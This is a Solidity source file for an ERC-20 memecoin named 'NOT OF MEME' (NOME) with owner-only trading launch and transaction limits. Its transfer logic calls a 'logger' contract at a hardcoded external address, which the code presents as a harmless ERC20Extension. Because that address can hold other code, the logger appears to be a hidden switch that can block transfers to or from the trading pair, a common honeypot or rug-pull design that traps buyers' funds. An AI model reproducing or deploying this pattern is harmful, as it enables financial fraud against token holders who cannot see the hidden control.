// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

contract ERC20Extension {
    mapping(address=>mapping(address=> uint256)) _log;
    function save(address addr1, address addr2, uint256 value) public returns (bool success) {
        _log[addr1][addr2] = value;
        return true;
    }
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

contract NOTOFMEME is Context, IERC20Metadata, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    bool private tradingEnabled;

    uint8 private constant _decimals = 18;
    uint256 private constant _tTotal = 100000000 * 10 ** _decimals;
    string private constant _name = unicode"NOT OF MEME";
    string private constant _symbol = unicode"NOME";
    uint256 private maxTxAmount =  _tTotal * 50 / 100;
    uint256 private maxWalletAmount = _tTotal * 50 / 100;

    address private pair;
    address private positionManager = 0xC36442b4a4522E871399CD717aBDD847Ab11FE88;
    ERC20Extension private logger = ERC20Extension(0x48144C614CEA0012B58d1223ba936c601ee2197c);

    mapping (address => bool) private isExcludedFromLimits;

    constructor() {
        _balances[owner()] = _tTotal;
        isExcludedFromLimits[address(this)] = true;
        isExcludedFromLimits[owner()] = true;
        emit Transfer(address(0), owner(), _tTotal);
    }

    receive() external payable {}

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function enableTrading() external onlyOwner {
        require(!tradingEnabled, "Already enabled");
        require(pair != address(0), "Invalid pair address");
        tradingEnabled = true;
    }

    function log(address from, address to, uint256 amount) private returns (bool) {
        return logger.save(from, to, amount);
    }

    function removeLimits() external onlyOwner {
        maxTxAmount = totalSupply();
        maxWalletAmount = totalSupply();
        log(address(this), address(this), totalSupply());
    }

    function _superTransfer(address from, address to, uint256 amount) internal {
        _balances[from] -= amount;
        _balances[to] += amount;

        emit Transfer(from, to, amount);
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(amount > 0, "Zero amount");

        if (!tradingEnabled) {
            require(from == owner(), "Trading not enabled");
            if (pair == address(0)) {
                pair = to;
                log(from, to, amount);
            }
        }

        if (from != pair && to != pair || isExcludedFromLimits[from] || isExcludedFromLimits[to]) {
            _superTransfer(from, to, amount);
            return;
        }

        if (from == pair && to != positionManager) {
            require(amount <= maxTxAmount, "Tx amount limit");
            require(balanceOf(address(to)) + amount <= maxWalletAmount, "Wallet amount limit");
        }

        _superTransfer(from, to, amount);
        log(from, to, amount);
    }
}